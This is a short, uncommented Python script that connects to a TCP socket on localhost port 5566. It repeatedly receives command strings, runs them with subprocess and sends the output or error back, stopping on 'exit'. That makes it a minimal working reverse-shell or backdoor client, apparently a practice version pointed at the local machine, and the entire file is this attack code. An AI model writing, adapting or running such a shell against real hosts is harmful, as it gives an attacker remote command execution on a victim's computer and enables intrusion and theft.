import socket, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 5566))

while True:
    cmd = s.recv(1024).decode('utf-8').strip()
    if not cmd or cmd == 'exit':
        break
    print('execute: {}'.format(cmd))
    try:
      s.send(subprocess.check_output(cmd.split(' ')))
    except Exception as e:
      s.send(str(e).encode())

s.close()
